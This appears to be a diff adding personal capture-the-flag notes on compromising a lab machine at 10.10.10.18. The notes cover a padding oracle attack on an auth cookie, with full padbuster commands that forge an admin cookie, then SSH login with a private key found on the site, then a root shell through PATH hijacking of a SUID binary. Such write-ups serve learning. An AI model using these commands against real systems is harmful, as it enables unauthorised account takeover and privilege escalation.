@@ -1,0 +1,59 @@
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+OpenSSH version is really old, OpenSSH 6.6 is released since 2014. Lots of published CVEs <------ Look into this!!!!!
+Attempted some exploits with OpenSSH 6.6 vuln -> didn't seem to work, moving on
+
+Found some open directories on the servers! Nothing seems to be interesting!
+When trying to register new account with the same username -> database alerts -> duplicate PRIMARY key -> potential SQL injection?
+
+user: jakem13
+auth cookie: SkxsoQ1a8c51Px8RtvnGtfR5xqhItdg6
+
+user: jakemmmmmmmmmmmmmmmm
+auth cookie: unbK%2Bd%2FsWMI8i9tM%2Fj1DJUMl4ugt9Z9D4S3YWrAQMbR7OA8oUV1VLg%3D%3D
+decoded:     unbK+d/sWMI8i9tM/j1DJUMl4ugt9Z9D4S3YWrAQMbR7OA8oUV1VLg==
+this, however, didn't return ascii when b64 decoded.
+
+But the auth cookie is longer with a longer username
+-> Assumption: user is encrypted using block cipher (CBC) to return the auth cookie!
+
+Googling shows there's an attack called Padding Oracle Attack for this kind of stuff.
+
+Learnt how to use padbuster to automate padding oracle attacK:
+padbuster http://10.10.10.18/index.php SkxsoQ1a8c51Px8RtvnGtfR5xqhItdg6 8 -cookies auth=SkxsoQ1a8c51Px8RtvnGtfR5xqhItdg6 -encoding 0
+8 is the blocksize
+encoding 0 for base 64
+
+padbuster returns the plaintext: user=jakem13 -> original user
+
+Now add user=admin as -plaintext user=admin
+padbuster http://10.10.10.18/index.php SkxsoQ1a8c51Px8RtvnGtfR5xqhItdg6 8 -cookies auth=SkxsoQ1a8c51Px8RtvnGtfR5xqhItdg6 -encoding 0 -plaintext user=admin
+padbuster returns the encrypted string: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA <------ this will likely be the auth cookie for admin.
+Now feed this into burp and forward the request.
+
+admin session gained! Logged in as admin!
+"Tasos this is my ssh key, just in case, if you ever want to login and check something out."
+ssh private key retrieved!
+
+user name could be admin? (prob not that easy) --> tried, failed
+user name could be Tasos? --> tried, failed
+user name could be mitsos? (the url to the private key is: http://10.10.10.18/mysshkeywithnamemitsos) --> shell popped! -> user pwned
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+There is a binary called backup with suid, using strings and ltrace show that it executes "cat /etc/shadow"
+
+GDB peda is provided, might have to do some binary exploitation?
+
+An easy way out is: cat path is not absolute path -> potential path hijack
+create a shell script:
+#!/bin/sh
+/bin/sh
+
+export current path on top of the other path in $PATH
+when backup is execute, the binary will call cat in the current dir -> the shell script and pop a root shell -> profit
+root pwned!
+
+
+
